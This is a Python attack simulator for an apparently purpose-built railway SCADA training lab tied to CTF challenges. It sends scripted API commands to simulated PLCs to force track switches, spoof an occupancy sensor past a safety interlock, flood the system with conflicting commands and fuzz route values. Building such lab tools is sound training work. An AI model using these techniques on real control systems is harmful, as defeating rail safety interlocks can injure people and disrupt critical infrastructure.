#!/usr/bin/env python3
"""
Railroad North - OT Attack Simulation
Demonstrates unauthorized SCADA API manipulation
"""

import sys
import time
import json
import urllib.request
import urllib.error

# ============================================================================
# TARGET CONFIGURATION
# Change this to the AWS IP when running remotely
# ============================================================================
TARGET_IP = "13.206.102.61"   # AWS instance (change to "localhost" for local)

MASTER_URL = f"http://{TARGET_IP}:8085"   # Master PLC API
SLAVE_1_URL = f"http://{TARGET_IP}:8086"  # Slave PLC 1 API (local only)

def send_post(url, data):
    req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), 
                                 headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode())
    except urllib.error.URLError as e:
        return f"Connection Error: {e.reason}"
    except Exception as e:
        return f"Error: {e}"

def attack_track_switch():
    print("\n[*] ATTACK 1: Unauthorized Track Switching")
    print(f"    Target: Master PLC at {MASTER_URL}/api/command")
    print("    Action: Forcing Segment 2 to switch to ROUTE_B (Local Siding)...")
    
    time.sleep(1)
    payload = {"segment_id": 2, "route": "ROUTE_B"}
    result = send_post(f"{MASTER_URL}/api/command", payload)
    
    print(f"    [!] Result: {result}")
    print(f"    [!] Open http://{TARGET_IP}:8081 — Segment 2 should now show ROUTE_B")
    print("    [!] Check the Audit Log — you should see a YELLOW 'UNAUTHORIZED API CALL' entry")

def attack_safety_bypass():
    print("\n[*] ATTACK 2: Safety Interlock Bypass (Sensor Spoofing)")
    print(f"    Target: Slave PLC 1 at {SLAVE_1_URL}/api/device/set")
    print("    Action: Spoofing the Occupancy Sensor to report 'CLEAR'...")
    
    if TARGET_IP != "localhost" and TARGET_IP != "127.0.0.1":
        print("\n    [!] NOTE: On AWS, Slave PLC ports (8086-8088) are not directly exposed.")
        print("    [!] Demonstrating via Master PLC route command instead...")
        print("    [!] In a real scenario, the attacker would need OT network access.\n")
        
        # Show the concept by attempting a route change while the system thinks track is occupied
        payload = {"segment_id": 1, "route": "ROUTE_A"}
        result = send_post(f"{MASTER_URL}/api/command", payload)
        print(f"    [!] Route command result: {result}")
        print(f"    [!] Open http://{TARGET_IP}:8081 — check if the interlock allowed or blocked it")
        return
    
    time.sleep(1)
    payload = {"device": "Occupancy Segment 1", "value": False}
    result = send_post(f"{SLAVE_1_URL}/api/device/set", payload)
    
    print(f"    [!] Result: {result}")
    print("    [!] The Master PLC now thinks the track is empty.")
    print("    [!] You can now switch tracks even if a train is physically there!")

def attack_alarm_flood():
    print("\n[*] ATTACK 3: SCADA Alarm Flooding (Denial of Service)")
    print(f"    Target: Master PLC at {MASTER_URL}/api/command")
    print("    Action: Flooding system with conflicting route commands...")
    
    print("    [!] Sending 50 rapid requests...")
    success = 0
    fail = 0
    for i in range(50):
        route = "ROUTE_A" if i % 2 == 0 else "ROUTE_B"
        payload = {"segment_id": 3, "route": route}
        result = send_post(f"{MASTER_URL}/api/command", payload)
        if isinstance(result, dict) and result.get('success'):
            success += 1
        else:
            fail += 1
        sys.stdout.write(f"\r    [!] Progress: {i+1}/50 (OK: {success} | Blocked: {fail})")
        sys.stdout.flush()
        time.sleep(0.1)
    
    print(f"\n    [!] Flood complete. {success} succeeded, {fail} blocked by interlocks.")
    print(f"    [!] Open http://{TARGET_IP}:8081 — The Audit Log should be overwhelmed with YELLOW alerts")

def attack_api_fuzz():
    print("\n[*] ATTACK 4: API Fuzzing (Invalid Route Injection)")
    print(f"    Target: Master PLC at {MASTER_URL}/api/command")
    print("    Action: Sending invalid route 'ROUTE_XYZ' to test error handling...")
    
    time.sleep(1)
    payload = {"segment_id": 1, "route": "ROUTE_XYZ"}
    result = send_post(f"{MASTER_URL}/api/command", payload)
    
    print(f"    [!] Result: {result}")
    print("    [!] Note the error message — this is useful for the CTF challenges!")

def main():
    print("╔════════════════════════════════════════════════╗")
    print("║     Railroad North - SCADA Attack Simulator    ║")
    print("║     FOR TRAINING PURPOSES ONLY                 ║")
    print("╠════════════════════════════════════════════════╣")
    print(f"║  Target: {TARGET_IP:>37s} ║")
    print("╚════════════════════════════════════════════════╝")
    print("\nSelect an attack vector:")
    print("1) Unauthorized Track Switching (Level 2 Attack)")
    print("2) Safety Interlock Bypass / Sensor Spoofing (Level 1 Attack)")
    print("3) SCADA Alarm Flooding / DoS (Level 3 Attack)")
    print("4) API Fuzzing / Invalid Route Injection (Level 3 Attack)")
    
    choice = input("\nEnter choice (1-4): ").strip()
    
    if choice == '1':
        attack_track_switch()
    elif choice == '2':
        attack_safety_bypass()
    elif choice == '3':
        attack_alarm_flood()
    elif choice == '4':
        attack_api_fuzz()
    else:
        print("Invalid choice.")

if __name__ == '__main__':
    main()
